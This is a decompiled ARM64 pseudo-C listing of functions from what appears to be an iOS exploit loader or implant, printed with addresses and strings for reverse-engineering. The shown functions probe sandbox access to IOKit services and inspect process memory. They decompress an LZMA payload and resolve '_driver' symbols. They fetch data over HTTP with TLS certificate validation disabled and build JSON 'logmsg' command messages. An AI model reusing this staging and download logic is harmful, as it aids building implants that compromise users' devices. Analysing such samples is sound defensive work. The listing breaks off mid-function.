__int64 __fastcall sub_812C(__int64 a1, int a2, _QWORD *a3, _DWORD *a4)
{
  __int64 result; // x0
  __int64 v6; // x9
  __int64 v7; // x10
  int v8; // w8

  result = 708609;
  if ( a1 )
  {
    if ( a3 )
    {
      if ( a4 )
      {
        *a3 = 0;
        *a4 = 0;
        if ( a2 )
        {
          v6 = 0;
          while ( *(_DWORD *)(a1 + v6 + 320) != a2 )
          {
            v6 += 48;
            if ( v6 == 1152 )
              return 28675;
          }
          v7 = *(_QWORD *)(a1 + v6 + 328);
          if ( v7 && (v8 = *(_DWORD *)(a1 + v6 + 336)) != 0 )
          {
            result = 0;
            *a3 = v7;
            *a4 = v8;
          }
          else
          {
            return 28674;
          }
        }
      }
    }
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_8210
// Address:  0x8210  Size: 136 bytes
// Calls:    sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_8210(_QWORD *a1)
{
  __int64 i; // x8
  _OWORD *v2; // x9

  for ( i = 40; i != 184; i += 6 )
  {
    v2 = &a1[i];
    v2[1] = 0u;
    v2[2] = 0u;
    *v2 = 0u;
  }
  a1[29] = sub_7C9C;
  a1[30] = sub_7E10;
  a1[31] = sub_7ED4;
  a1[32] = sub_7FC8;
  a1[33] = sub_8080;
  a1[34] = sub_812C;
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_8298
// Address:  0x8298  Size: 408 bytes
// Calls:    sub_B0FC, _getpid, _proc_pidinfo, _vm_region_64
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_8298(__int64 a1)
{
  __int64 result; // x0
  pid_t v3; // w0
  vm_address_t v4; // x8
  kern_return_t v5; // w0
  vm_size_t v6; // x8
  vm_size_t v7; // x9
  vm_address_t v8; // x10
  int v9; // w9
  vm_size_t v10; // x8
  mach_port_t object_name; // [xsp+8h] [xbp-88h] BYREF
  mach_msg_type_number_t infoCnt; // [xsp+Ch] [xbp-84h] BYREF
  int buffer[20]; // [xsp+10h] [xbp-80h] BYREF
  vm_address_t v14; // [xsp+60h] [xbp-30h]
  vm_size_t v15; // [xsp+68h] [xbp-28h]
  vm_size_t size; // [xsp+70h] [xbp-20h] BYREF
  vm_address_t address; // [xsp+78h] [xbp-18h] BYREF

  if ( *(_BYTE *)(a1 + 1474) || *(_BYTE *)(a1 + 1477) || *(_BYTE *)(a1 + 1479) )
  {
LABEL_4:
    *(_QWORD *)(a1 + 288) = sub_5DC8;
    if ( *(_BYTE *)(a1 + 1477) || *(_BYTE *)(a1 + 1479) )
      return 0;
    *(_DWORD *)(a1 + 80) = 0;
    return 0;
  }
  if ( *(_DWORD *)(a1 + 192) < 0xF0000u )
  {
    v4 = *(_QWORD *)(a1 + 72);
    size = 0;
    address = v4;
    infoCnt = 9;
    v5 = vm_region_64(mach_task_self_, &address, &size, 9, buffer, &infoCnt, &object_name);
    if ( v5 )
      return v5 | 0x80000000;
  }
  else
  {
    v3 = getpid();
    if ( proc_pidinfo(v3, 7, *(_QWORD *)(a1 + 72), buffer, 96) <= 0 )
      return 2147483653LL;
    size = v15;
    address = v14;
  }
  if ( !*(_QWORD *)(a1 + 1496) && buffer[0] != 7 )
    return 49153;
  result = 49155;
  if ( address )
  {
    v6 = size;
    if ( size )
    {
      v7 = size >> 1;
      size >>= 1;
      v8 = address + (v6 >> 1);
      if ( v6 >> 1 < *(unsigned int *)(v8 - 4) )
        return 49155;
      *(_QWORD *)(a1 + 312) = v8 - 4;
      *(_QWORD *)(a1 + 136) = v8;
      v9 = v7 - 0x100000;
      v10 = v6 >> 2;
      if ( !*(_BYTE *)(a1 + 1475) )
        LODWORD(v10) = v9;
      *(_DWORD *)(a1 + 144) = v10;
      *(_QWORD *)(a1 + 296) = sub_5E78;
      goto LABEL_4;
    }
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_8430
// Address:  0x8430  Size: 352 bytes
// Calls:    _malloc, _memset_s, _compression_decode_buffer, _free, sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_8430(uint8_t **a1, _DWORD *a2)
{
  __int64 v2; // x19
  uint8_t *v5; // x22
  rsize_t v7; // x23
  rsize_t v8; // x24
  uint8_t *v9; // x0
  uint8_t *v10; // x25

  v2 = 708609;
  if ( a1 )
  {
    v5 = *a1;
    if ( *a1 && a2 != 0 )
    {
      v7 = (unsigned int)*a2;
      if ( (_DWORD)v7 )
      {
        if ( (unsigned int)v7 >= 8
          && *(_DWORD *)v5 == 200142861
          && (v8 = *((unsigned int *)v5 + 1), (_DWORD)v8)
          && (int)v7 - 8 < (unsigned int)v8 )
        {
          v9 = (uint8_t *)malloc(v8 + 1);
          if ( v9 )
          {
            v10 = v9;
            memset_s(v9, v8, 0, v8);
            if ( compression_decode_buffer(v10, v8 + 1, v5 + 8, (unsigned int)(v7 - 8), 0, COMPRESSION_LZMA) == v8 )
            {
              memset_s(v5, v7, 0, v7);
              free(v5);
              v2 = 0;
              *a1 = v10;
              *a2 = v8;
            }
            else
            {
              memset_s(v10, v8, 0, v8);
              free(v10);
              return 708619;
            }
          }
          else
          {
            return 708617;
          }
        }
        else
        {
          return 0;
        }
      }
    }
  }
  return v2;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_8590
// Address:  0x8590  Size: 520 bytes
// Calls:    sub_B0FC, _malloc, _free, sub_5D2C
// Xrefs:    2 callers
// Strings:  "_driver"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_8590(__int64 a1, __int64 a2, _QWORD *a3)
{
  __int64 v5; // x22
  _QWORD *v6; // x0
  _QWORD *v7; // x20
  __int64 v8; // x2
  __int64 v9; // x1
  __int64 v10; // x1
  _WORD **v11; // x23
  _WORD *v13; // x8
  __int64 v14; // x0
  __int64 v15; // x0
  __int64 v16; // x0
  __int64 v17; // x0
  __int64 v18; // x0
  __int64 v19; // x0
  __int64 v20; // x0
  __int64 v21; // x0
  __int64 v22; // [xsp+10h] [xbp-40h] BYREF
  __int64 v23; // [xsp+18h] [xbp-38h]

  v22 = 0;
  v23 = 0;
  v5 = sub_B0FC(a1, a2, &v22);
  if ( !(_DWORD)v5 )
  {
    v6 = malloc(0x10u);
    if ( v6 )
    {
      v7 = v6;
      v5 = sub_B0FC(a1, v22, 0);
      if ( (_DWORD)v5 )
        goto LABEL_20;
      if ( *(_QWORD *)(a1 + 288) )
        sub_B0FC(a1, *(_QWORD *)(v23 + 88), *(unsigned int *)(v23 + 168));
      v9 = v23;
      *v7 = v23;
      v5 = sub_B0FC(a1, v9, "_driver");
      if ( (_DWORD)v5
        || (v11 = (_WORD **)(v7 + 1), v5 = sub_B0FC(v7 + 1, v10, v8), (_DWORD)v5)
        || (v5 = 163847, (v13 = *v11) == 0)
        || *v13 != 2
        || (unsigned __int16)v13[1] < 2u )
      {
LABEL_20:
        if ( v23 && *(_QWORD *)(a1 + 304) )
          sub_B0FC(a1, v23, v8);
        free(v7);
      }
      else
      {
        sub_5D2C();
        *(_QWORD *)(v7[1] + 16LL) = v14;
        sub_5D2C();
        *(_QWORD *)(v7[1] + 24LL) = v15;
        sub_5D2C();
        *(_QWORD *)(v7[1] + 32LL) = v16;
        sub_5D2C();
        *(_QWORD *)(v7[1] + 40LL) = v17;
        sub_5D2C();
        *(_QWORD *)(v7[1] + 48LL) = v18;
        sub_5D2C();
        *(_QWORD *)(v7[1] + 56LL) = v19;
        sub_5D2C();
        *(_QWORD *)(v7[1] + 64LL) = v20;
        sub_5D2C();
        v5 = 0;
        *(_QWORD *)(v7[1] + 72LL) = v21;
        *a3 = v7;
      }
    }
    else
    {
      return 708617;
    }
  }
  return v5;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_8798
// Address:  0x8798  Size: 64 bytes
// Calls:    sub_8590, sub_B0FC
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_8798(__int64 a1, _QWORD *a2)
{
  return sub_8590(a1, 589824, a2);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_87D8
// Address:  0x87D8  Size: 104 bytes
// Calls:    sub_B0FC
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_87D8(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // x0
  __int64 v5; // x0

  result = 708609;
  if ( a1 && a3 )
  {
    v5 = *(_QWORD *)(a1 + 8);
    if ( v5 )
      return sub_B0FC(v5, a2, a3);
    else
      return 163846;
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_8840
// Address:  0x8840  Size: 116 bytes
// Calls:    sub_B0FC
// Xrefs:    6 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_8840(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // x0
  __int64 v5; // x8

  if ( !a1 )
    return 708609;
  result = 163842;
  if ( a2 )
  {
    v5 = *(_QWORD *)(a1 + 8);
    if ( v5 )
      return sub_B0FC(v5, a2, a3);
    else
      return 163846;
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_88B4
// Address:  0x88B4  Size: 116 bytes
// Calls:    sub_B0FC
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_88B4(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // x0
  __int64 v5; // x8

  if ( !a1 )
    return 708609;
  result = 163842;
  if ( a2 )
  {
    v5 = *(_QWORD *)(a1 + 8);
    if ( v5 )
      return sub_B0FC(v5, a2, a3);
    else
      return 163846;
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_8928
// Address:  0x8928  Size: 164 bytes
// Calls:    sub_B0FC, _free
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_8928(__int64 a1, _QWORD *a2, __int64 a3)
{
  __int64 v3; // x20
  __int64 v6; // x0
  __int64 v7; // x2

  v3 = 708609;
  if ( a1 && a2 )
  {
    v6 = a2[1];
    if ( v6 )
    {
      sub_B0FC(v6, a2, a3);
      v3 = sub_B0FC(a1, *a2, v7);
      *a2 = 0;
      a2[1] = 0;
      free(a2);
    }
    else
    {
      return 163846;
    }
  }
  return v3;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_89CC
// Address:  0x89CC  Size: 236 bytes
// Calls:    sub_9B60, _getpid, _sandbox_check, sub_B0FC
// Xrefs:    2 callers
// Strings:  "IOSurfaceRoot", "iokit-open-service"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_89CC(__int64 a1, bool *a2)
{
  __int64 result; // x0
  unsigned int v5; // w8
  __int64 v6; // x0
  __int64 v7; // x2
  const char *v8; // x1
  bool v9; // w8

  result = 708609;
  if ( a1 && a2 )
  {
    if ( (sub_9B60(a1) & 1) == 0 )
    {
      v5 = *(_DWORD *)(a1 + 192);
      if ( v5 > 0x100500 || v5 - 984839 <= 0xF8F8 )
      {
        v6 = getpid();
        v8 = 0;
        v7 = 0;
        goto LABEL_10;
      }
      if ( v5 >= 0x100000 )
      {
        v6 = getpid();
        v7 = SANDBOX_CHECK_NO_REPORT;
        v8 = "iokit-open-service";
LABEL_10:
        v9 = (int)sandbox_check(v6, v8, v7) > 0;
        goto LABEL_11;
      }
    }
    v9 = 0;
LABEL_11:
    *a2 = v9;
    return 0;
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_8AB8
// Address:  0x8AB8  Size: 164 bytes
// Calls:    sub_89CC, _strncasecmp, sub_B0FC
// Xrefs:    2 callers
// Strings:  "MobileStore/1.0"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_8AB8(__int64 a1)
{
  __int64 v2; // x20
  const char *v3; // x1
  bool v4; // w8
  bool v6; // [xsp+Fh] [xbp-11h] BYREF

  if ( !a1 )
    return 708609;
  v6 = 0;
  v2 = sub_89CC(a1, &v6);
  if ( !(_DWORD)v2 )
  {
    *(_BYTE *)(a1 + 1512) = v6;
    v3 = *(const char **)(a1 + 160);
    if ( v3 )
      v4 = strncasecmp("MobileStore/1.0", v3, 0xFu) == 0;
    else
      v4 = 0;
    *(_BYTE *)(a1 + 1516) = v4;
  }
  return v2;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_8B5C
// Address:  0x8B5C  Size: 1956 bytes
// Calls:    _CFStringCreateWithCString, _CFStringGetLength, _strlen, _CFDataCreate, _CFRelease, _CFURLCreateWithString, _CFURLCopyScheme, _CFHTTPMessageCreateRequest, _CFHTTPMessageSetBody, _CFHTTPMessageSetHeaderFieldValue, _CFReadStreamCreateForHTTPRequest, _CFEqual, _CFDictionaryCreate, _CFReadStreamSetProperty, _SCDynamicStoreCopyProxies
// Xrefs:    3 callers
// Strings:  "POST", "GET", "User-Agent", "Content-Type", "https"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_8B5C(
        char *cStr,
        const char *a2,
        const char *a3,
        const char *a4,
        unsigned __int64 a5,
        unsigned __int64 a6)
{
  _BOOL4 v6; // w8
  _BOOL4 v7; // w9
  __int64 v8; // x20
  int v10; // w19
  const __CFString *v15; // x0
  const __CFString *v16; // x27
  const __CFString *v17; // x0
  const __CFString *v18; // x0
  const __CFString *v19; // x21
  size_t v20; // x0
  CFDataRef v21; // x0
  const __CFString *v22; // x19
  unsigned int v23; // w26
  CFDataRef *v24; // x11
  const char *v25; // x8
  const __CFURL *v26; // x0
  const void *v27; // x28
  const __CFString *v28; // x24
  CFStringRef v29; // x0
  CFStringRef v30; // x27
  const __CFString *v31; // x21
  __CFHTTPMessage *Request; // x0
  __CFHTTPMessage *v33; // x20
  const __CFString *v34; // x0
  const __CFString *v35; // x0
  CFReadStreamRef v36; // x0
  CFStringRef v37; // x0
  CFDictionaryRef v38; // x0
  CFDictionaryRef v39; // x20
  CFDictionaryRef v40; // x0
  CFDictionaryRef v41; // x20
  CFHTTPMessageRef Empty; // x0
  CFHTTPMessageRef v43; // x20
  CFHTTPMessageRef *v44; // x0
  __int64 v45; // x0
  void (__cdecl *v46)(CFReadStreamRef, CFStreamEventType, void *); // x0
  __CFRunLoop *Current; // x0
  CFHTTPMessageRef *v48; // x0
  CFDataRef v49; // x0
  const __CFData *v50; // x20
  unsigned int Length; // w21
  const UInt8 *BytePtr; // x0
  const UInt8 *v53; // x20
  void *v54; // x0
  void *v55; // x25
  CFHTTPMessageRef *v57; // [xsp+0h] [xbp-140h]
  CFHTTPMessageRef cf; // [xsp+8h] [xbp-138h]
  char v59; // [xsp+34h] [xbp-10Ch]
  __CFReadStream *stream; // [xsp+48h] [xbp-F8h]
  const __CFData *bodyData; // [xsp+50h] [xbp-F0h]
  const __CFString *v62; // [xsp+58h] [xbp-E8h]
  const __CFString *value; // [xsp+68h] [xbp-D8h]
  int v64; // [xsp+70h] [xbp-D0h]
  int v65; // [xsp+70h] [xbp-D0h]
  CFDataRef v66; // [xsp+70h] [xbp-D0h]
  CFStringRef v67; // [xsp+78h] [xbp-C8h]
  const __CFString *v68; // [xsp+80h] [xbp-C0h]
  const __CFString *v69; // [xsp+88h] [xbp-B8h]
  __CFHTTPMessage *v70; // [xsp+90h] [xbp-B0h]
  char *cStra; // [xsp+98h] [xbp-A8h]
  CFDataRef *v72; // [xsp+A0h] [xbp-A0h]
  CFDataRef v73; // [xsp+A8h] [xbp-98h] BYREF
  CFStreamClientContext keys; // [xsp+B0h] [xbp-90h] BYREF
  void *values; // [xsp+E0h] [xbp-60h] BYREF

  v73 = 0;
  v6 = a5 != 0;
  v7 = a6 != 0;
  v8 = 708609;
  if ( !cStr )
    return v8;
  if ( !*cStr )
    return v8;
  v10 = v6 && v7;
  if ( (!v6 || !v7) && (a5 | a6) != 0 )
    return v8;
  v15 = CFStringCreateWithCString(kCFAllocatorDefault, cStr, 0x8000100u);
  if ( !v15 )
  {
    v8 = 12290;
    goto LABEL_118;
  }
  v16 = v15;
  if ( CFStringGetLength(v15) < 1 )
  {
    v8 = 12291;
    goto LABEL_117;
  }
  if ( a2 )
  {
    v17 = CFStringCreateWithCString(kCFAllocatorDefault, a2, 0x8000100u);
    if ( !v17 )
    {
      v8 = 12310;
      goto LABEL_117;
    }
    a2 = (const char *)v17;
    if ( CFStringGetLength(v17) <= 0 )
    {
      CFRelease(v16);
      v19 = 0;
      v22 = 0;
      v8 = 12311;
      goto LABEL_112;
    }
  }
  if ( a3 )
  {
    v18 = CFStringCreateWithCString(kCFAllocatorDefault, a3, 0x8000100u);
    if ( !v18 )
    {
      v22 = 0;
      v19 = 0;
      v8 = 12310;
      goto LABEL_111;
    }
    v62 = v18;
    if ( CFStringGetLength(v18) < 1 )
    {
      v19 = 0;
      v8 = 12311;
LABEL_20:
      v22 = v62;
      goto LABEL_111;
    }
  }
  else
  {
    v62 = 0;
  }
  value = (const __CFString *)a2;
  if ( a4 )
  {
    v20 = strlen(a4);
    v21 = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)a4, v20);
    if ( !v21 )
    {
      v19 = 0;
      v8 = 12312;
      goto LABEL_20;
    }
  }
  else
  {
    v21 = 0;
  }
  v23 = 0;
  if ( v10 )
    v24 = &v73;
  else
    v24 = 0;
  v25 = "POST";
  v59 = v10 ^ 1;
  bodyData = v21;
  if ( !v21 )
    v25 = "GET";
  cStra = (char *)v25;
  v72 = v24;
  if ( v10 )
LABEL_30:
    *v72 = 0;
  while ( 1 )
  {
    v26 = CFURLCreateWithString(kCFAllocatorDefault, v16, 0);
    if ( v26 )
      break;
    if ( v23 >= 7 )
    {
      v8 = 12290;
      goto LABEL_109;
    }
LABEL_50:
    ++v23;
    if ( v10 )
      goto LABEL_30;
  }
  v27 = v26;
  v28 = v16;
  v29 = CFURLCopyScheme(v26);
  if ( !v29 )
  {
    v8 = 12301;
LABEL_46:
    v16 = v28;
LABEL_47:
    CFRelease(v27);
    goto LABEL_48;
  }
  v30 = v29;
  v31 = CFStringCreateWithCString(kCFAllocatorDefault, cStra, 0x8000100u);
  v8 = 708617;
  if ( !v31 )
  {
LABEL_44:
    CFRelease(v27);
    CFRelease(v30);
    if ( !v31 )
    {
      v16 = v28;
      goto LABEL_48;
    }
    v27 = v31;
    goto LABEL_46;
  }
  Request = CFHTTPMessageCreateRequest(kCFAllocatorDefault, v31, (CFURLRef)v27, kCFHTTPVersion1_1);
  if ( !Request )
  {
    v8 = 12297;
    goto LABEL_44;
  }
  v33 = Request;
  if ( bodyData )
    CFHTTPMessageSetBody(Request, bodyData);
  v70 = v33;
  if ( value )
  {
    v34 = CFStringCreateWithCString(kCFAllocatorDefault, "User-Agent", 0x8000100u);
    if ( !v34 )
    {
      v66 = 0;
      v69 = 0;
      goto LABEL_78;
    }
    v69 = v34;
    CFHTTPMessageSetHeaderFieldValue(v33, v34, value);
  }
  else
  {
    v69 = 0;
  }
  if ( v62 )
  {
    v35 = CFStringCreateWithCString(kCFAllocatorDefault, "Content-Type", 0x8000100u);
    if ( v35 )
    {
      v68 = v35;
      CFHTTPMessageSetHeaderFieldValue(v33, v35, v62);
      goto LABEL_58;
    }
    v66 = 0;
LABEL_78:
    v67 = 0;
    v68 = 0;
    v8 = 708617;
    goto LABEL_91;
  }
  v68 = 0;
LABEL_58:
  v36 = CFReadStreamCreateForHTTPRequest(kCFAllocatorDefault, v33);
  if ( !v36 )
  {
    v66 = 0;
    v67 = 0;
    v8 = 12298;
    goto LABEL_91;
  }
  stream = v36;
  v37 = CFStringCreateWithCString(kCFAllocatorDefault, "https", 0x8000100u);
  v67 = v37;
  if ( v37 )
  {
    if ( CFEqual(v37, v30) )
    {
      keys.version = (CFIndex)kCFStreamSSLValidatesCertificateChain;
      values = kCFBooleanFalse;
      v38 = CFDictionaryCreate(kCFAllocatorDefault, (const void **)&keys, (const void **)&values, 1, 0, 0);
      if ( !v38 )
      {
        v66 = 0;
        v8 = 12303;
        goto LABEL_90;
      }
      v39 = v38;
      v64 = CFReadStreamSetProperty(stream, kCFStreamPropertySSLSettings, v38);
      CFRelease(v39);
      if ( !v64 )
        goto LABEL_80;
    }
    v40 = SCDynamicStoreCopyProxies(0);
    if ( !v40 )
    {
      v66 = 0;
      v8 = 12302;
      goto LABEL_90;
    }
    v41 = v40;
    v65 = CFReadStreamSetProperty(stream, kCFStreamPropertyHTTPProxy, v40);
    CFRelease(v41);
    if ( v65 )
    {
      Empty = CFHTTPMessageCreateEmpty(kCFAllocatorDefault, 0);
      if ( Empty )
      {
        v43 = Empty;
        v44 = (CFHTTPMessageRef *)calloc(0x10u, 1u);
        cf = v43;
        if ( !v44 )
        {
          v66 = 0;
          v8 = 708617;
LABEL_89:
          CFRelease(cf);
          goto LABEL_90;
        }
        *v44 = v43;
        *((_DWORD *)v44 + 3) = 500;
        keys.version = 0;
        memset(&keys.retain, 0, 24);
        v57 = v44;
        keys.info = v44;
        sub_5D2C();
        v46 = (void (__cdecl *)(CFReadStreamRef, CFStreamEventType, void *))sub_5D68(v45, 0);
        if ( CFReadStreamSetClient(stream, 0x1Au, v46, &keys) )
        {
          Current = CFRunLoopGetCurrent();
          CFReadStreamScheduleWithRunLoop(stream, Current, kCFRunLoopCommonModes);
          if ( CFReadStreamOpen(stream) )
          {
            CFRunLoopRunInMode(kCFRunLoopDefaultMode, 240.0, 0);
            CFReadStreamClose(stream);
            v48 = v57;
            v8 = *((unsigned int *)v57 + 2);
            if ( (_DWORD)v8
              || (*((_DWORD *)v57 + 3) <= 0x18Fu ? (v8 = 0) : (v8 = 12305), (*((_DWORD *)v57 + 3) > 0x18Fu) | v59 & 1) )
            {
              v66 = 0;
LABEL_88:
              free(v48);
              goto LABEL_89;
            }
            v49 = CFHTTPMessageCopyBody(*v57);
            if ( v49 )
            {
              v8 = 0;
              v66 = v49;
              *v72 = v49;
            }
            else
            {
              v66 = 0;
              v8 = 12313;
            }
          }
          else
          {
            v66 = 0;
            v8 = 12299;
          }
        }
        else
        {
          v66 = 0;
          v8 = 12304;
        }
        v48 = v57;
        goto LABEL_88;
      }
      v66 = 0;
      v8 = 12297;
    }
    else
    {
LABEL_80:
      v66 = 0;
      v8 = 12300;
    }
  }
  else
  {
    v66 = 0;
    v8 = 708617;
  }
LABEL_90:
  CFRelease(stream);
LABEL_91:
  CFRelease(v70);
  CFRelease(v27);
  CFRelease(v30);
  CFRelease(v31);
  if ( v69 )
    CFRelease(v69);
  v16 = v28;
  if ( v68 )
    CFRelease(v68);
  if ( v67 )
    CFRelease(v67);
  v27 = v66;
  if ( v66 && (_DWORD)v8 )
    goto LABEL_47;
LABEL_48:
  if ( v23 <= 6 && (_DWORD)v8 )
    goto LABEL_50;
  if ( ((_DWORD)v8 != 0) | v59 & 1 )
  {
LABEL_109:
    a2 = (const char *)value;
    goto LABEL_110;
  }
  v50 = v73;
  a2 = (const char *)value;
  if ( !v73 )
    goto LABEL_121;
  Length = CFDataGetLength(v73);
  if ( !Length )
  {
    v8 = 12292;
    goto LABEL_110;
  }
  BytePtr = CFDataGetBytePtr(v50);
  if ( !BytePtr )
  {
LABEL_121:
    v8 = 12293;
    goto LABEL_110;
  }
  v53 = BytePtr;
  v54 = malloc(Length);
  if ( v54 )
  {
    v55 = v54;
    memcpy(v54, v53, Length);
    v8 = 0;
    *(_QWORD *)a5 = v55;
    *(_DWORD *)a6 = Length;
  }
  else
  {
    v8 = 708617;
  }
LABEL_110:
  v19 = (const __CFString *)bodyData;
  v22 = v62;
LABEL_111:
  CFRelease(v16);
  if ( a2 )
LABEL_112:
    CFRelease(a2);
  if ( v22 )
    CFRelease(v22);
  if ( v19 )
  {
    v16 = v19;
LABEL_117:
    CFRelease(v16);
  }
LABEL_118:
  if ( v73 )
    CFRelease(v73);
  return v8;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_9300
// Address:  0x9300  Size: 152 bytes
// Calls:    sub_987C, sub_8B5C, sub_B0FC
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_9300(__int64 a1, char *cStr, unsigned __int64 a3, unsigned __int64 a4)
{
  __int64 result; // x0
  bool v6; // zf

  result = 708609;
  if ( a1 && cStr )
  {
    if ( *cStr )
      v6 = a3 == 0;
    else
      v6 = 1;
    if ( !v6 && a4 != 0 )
    {
      if ( *(_QWORD *)(a1 + 1504) )
        return sub_987C(a1);
      else
        return sub_8B5C(cStr, *(const char **)(a1 + 160), 0, 0, a3, a4);
    }
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_9398
// Address:  0x9398  Size: 284 bytes
// Calls:    _strncmp, sub_94B4, sub_8B5C, _bzero, _free, sub_B0FC
// Xrefs:    2 callers
// Strings:  "http://", "https://", "application/json"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_9398(char *__s1, const char *a2, char a3)
{
  __int64 v6; // x21

  if ( !__s1 || !*__s1 )
    return 0;
  if ( strncmp(__s1, "http://", 7u) && strncmp(__s1, "https://", 8u) )
    return 708628;
  v6 = sub_94B4(a3);
  if ( !(_DWORD)v6 )
  {
    v6 = sub_8B5C(__s1, a2, "application/json", 0, 0, 0);
    bzero(0, 0);
    free(0);
  }
  return v6;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_94B4
// Address:  0x94B4  Size: 204 bytes
// Calls:    sub_9A34, _bzero, _free, sub_B0FC
// Xrefs:    3 callers
// Strings:  "{\"e\":%u,\"f\":\"%s\",\"l\":%u}", "{\"e\":%u,\"l\":%u}", "{"cmd":"logmsg","args":{"msg":"%s"}}"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_94B4(char a1, __int64 a2, __int64 a3, int a4, int a5, int a6, int a7, int a8)
{
  __int64 v10; // x0
  int v11; // w3
  int v12; // w4
  int v13; // w5
  int v14; // w6
  int v15; // w7
  __int64 v16; // x21
  _DWORD v18[3]; // [xsp+24h] [xbp-2Ch] BYREF

  memset(v18, 0, sizeof(v18));
  if ( a2 )
    v10 = sub_9A34((int)&v18[1], (int)v18, "{\\\"e\\\":%u,\\\"f\\\":\\\"%s\\\",\\\"l\\\":%u}", a4, a5, a6, a7, a8, a1);
  else
    v10 = sub_9A34((int)&v18[1], (int)v18, "{\\\"e\\\":%u,\\\"l\\\":%u}", a4, a5, a6, a7, a8, a1);
  v16 = v10;
  if ( !(_DWORD)v10 )
  {
    v16 = sub_9A34(a4, a5, "{\"cmd\":\"logmsg\",\"args\":{\"msg\":\"%s\"}}", v11, v12, v13, v14, v15, v18[1]);
    bzero(*(void **)&v18[1], v18[0]);
    free(*(void **)&v18[1]);
  }
  return v16;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_9580
// Address:  0x9580  Size: 376 bytes
// Calls:    _strncmp, sub_9398, sub_B0FC, sub_94B4, sub_987C, _bzero, _free
// Xrefs:    2 callers
// Strings:  "http://", "https://"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_9580(
        __int64 a1,
        char a2,
        __int64 a3,
        __int64 a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        unsigned int a10,
        size_t a11,
        int a12,
        unsigned int a13,
        size_t a14)
{
  __int64 v14; // x19
  const char *v19; // x24
  int v20; // w5
  int v21; // w6
  int v22; // w7
  unsigned int v24; // w0

  v14 = 708609;
  if ( a1 )
  {
    if ( *(_QWORD *)(a1 + 1504) )
    {
      v19 = *(const char **)(a1 + 168);
      if ( v19 && *v19 )
      {
        if ( !strncmp(*(const char **)(a1 + 168), "http://", 7u) || !strncmp(v19, "https://", 8u) )
        {
          v14 = sub_94B4(a2, a3, a4, (int)&a11, (int)&a10, v20, v21, v22);
          if ( !(_DWORD)v14 )
          {
            v24 = sub_987C(a1);
            if ( v24 )
            {
              if ( v24 == 12306 )
                v14 = 0;
              else
                v14 = v24;
            }
            else
            {
              bzero((void *)a14, a13);
              free((void *)a14);
              v14 = 0;
              a14 = 0;
            }
            bzero((void *)a11, a10);
            free((void *)a11);
          }
        }
        else
        {
          return 708628;
        }
      }
      else
      {
        return 0;
      }
    }
    else
    {
      return sub_9398(*(char **)(a1 + 168), *(const char **)(a1 + 160), a2);
    }
  }
  return v14;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_96F8
// Address:  0x96F8  Size: 152 bytes
// Calls:    _semaphore_create, sub_B0FC
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_96F8(__int64 a1)
{
  kern_return_t v1; // w0

  if ( !a1 )
    return 708609;
  *(_QWORD *)(a1 + 64) = sub_9300;
  *(_QWORD *)(a1 + 1520) = sub_9580;
  if ( !*(_QWORD *)(a1 + 1504) )
    return 0;
  v1 = semaphore_create(mach_task_self_, (semaphore_t *)(a1 + 1528), 0, 1);
  if ( v1 )
    return v1 | 0x80000000;
  else
    return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_9790
// Address:  0x9790  Size: 236 bytes
// Calls:    _CFReadStreamRead, _CFHTTPMessageAppendBytes, _CFReadStreamCopyProperty, _CFHTTPMessageGetResponseStatusCode, _CFRelease, _CFRunLoopGetCurrent, _CFRunLoopStop, sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

void __fastcall sub_9790(__CFReadStream *a1, __int64 a2, __int64 a3)
{
  __int64 v4; // x0
  __CFHTTPMessage *v5; // x0
  __CFHTTPMessage *v6; // x20
  __CFRunLoop *Current; // x0
  UInt8 v8[4096]; // [xsp+0h] [xbp-1020h] BYREF

  if ( !a1 || !a3 )
    goto LABEL_15;
  if ( a2 > 3 )
  {
    switch ( a2 )
    {
      case 4LL:
        return;
      case 8LL:
        *(_DWORD *)(a3 + 8) = 12296;
        break;
      case 16LL:
        v5 = (__CFHTTPMessage *)CFReadStreamCopyProperty(a1, kCFStreamPropertyHTTPResponseHeader);
        if ( v5 )
        {
          v6 = v5;
